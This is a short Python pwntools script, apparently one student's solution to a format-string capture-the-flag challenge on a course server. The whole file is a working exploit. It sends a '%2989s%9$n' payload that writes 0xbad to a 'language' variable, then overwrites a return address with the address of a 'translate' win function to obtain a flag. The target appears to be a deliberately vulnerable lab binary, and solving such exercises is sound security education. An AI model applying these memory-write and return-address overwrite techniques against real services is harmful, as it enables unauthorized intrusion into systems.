# format1ex.py - Aidan Wech (Onyxymous)
from pwn import *
import struct

# ssh variables
host = 'cs4401shell.walls.ninja'
port = 9898

# exploit variables
buffarg = 8	# which arg holds the buffer
winarg = 13	# which arg holds the return address we want to maniuplate
offset = 3 + (8 * (winarg - buffarg))	# offset is calculated

buff1addr = 0x7ffff7a631e7

# remote process
p = remote(host, port)
print(p.recvline(timeout=1))
print(p.recvline(timeout=1))

winaddr = 0x5555555548fa # reads the address of translate, converts to address
varaddr = 0x55555575504c # reads the address of language, converts to address

# logging
log.info(f'Translate Address: {hex(winaddr)}')
log.info(f'Language Address: {hex(varaddr)}')

# write 0xbad to language
languagecheck = flat(
    {
        0: '%2989s%9$n',
        11: p64(varaddr)
    }
)

log.info(f'Language Check: {languagecheck}')

p.sendline(languagecheck)
print(p.recvline(timeout=1))

# overwrite return address
exploit = flat(
    {
        0: 'Flag:',
        5: b' ' * (offset - 5),
        offset: p64(winaddr)
    }
)

p.sendline(exploit)
print(p.recvall(timeout=1))
